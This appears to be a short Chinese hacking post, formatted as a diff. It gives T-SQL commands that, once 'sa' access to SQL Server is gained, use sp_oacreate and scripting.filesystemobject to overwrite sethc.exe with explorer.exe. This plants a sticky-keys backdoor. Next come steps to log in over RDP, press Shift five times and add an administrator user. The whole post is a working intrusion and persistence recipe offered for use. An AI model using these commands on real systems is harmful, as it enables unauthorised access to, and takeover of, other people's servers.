@@ -1,0 +1,17 @@
+有了sa但无xp_cmdshell ，怎么恢复都提示出错。好象是xxxx.cpp哪里哪里出错。或者找不到指定模块，反正我遇到好多次了。在用exec sp_oacreate 'wscript.shell'也没办法的情况下。。可用此方法
+（很多服务器都把'wscript.shell'给删了。）
+看到既然能用sp_oacreate，sp_oamethod来弄'wscript.shell'或者scripting.filesystemobject
+网上看到的文章都只有几个用法就是'wscript.shell'执行命令或者scripting.filesystemobject来写入木马或读取文件。于是乎应该可以也能复制，删除文件吧。。
+上网找了些资料，得到下面方法：
+复制文件：
+
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out 
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+
+declare @oo int
+exec sp_oacreate 'scripting.filesystemobject', @oo out 
+exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
+
+成功后3389登陆按五次shift键。成功进入服务器。一直向上点"我的电脑"右键"管理" 用户管理直接加用户。
+此法随无技术可言，希望对某些人有点用。
